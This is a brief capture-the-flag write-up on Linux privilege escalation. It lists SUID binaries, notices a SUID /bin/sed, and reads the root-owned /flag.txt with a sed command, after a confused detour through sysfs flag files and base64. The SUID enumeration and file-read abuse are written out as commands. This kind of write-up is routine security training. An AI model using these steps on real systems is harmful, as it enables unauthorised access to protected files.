Find SUID files and found a suspicous `/bin/sed`
```
ctf@e95bd34e8896:~$ find / -perm -u=s -type f 2>/dev/null
/bin/sed
/bin/su
/bin/mount
/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
```
The `/bin/sed` can be useful

find flag in `/` directory
```
/flag.txt
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
```
Their content:
```
0x1003 0x9
```
to base64
```
AQAwCQ==
```
to text
```
(not printable, too arrow facing outward each other)
```


suspcious file in /sys/devices/platform/serial8250/tty/*/flags
```
-r--r----- 1 root root 4096 Apr 21 03:05 /sys/devices/platform/serial8250/tty/ttyS0/flags
```

# solution
```
sed '/MCA*/p' /flag.txt

```




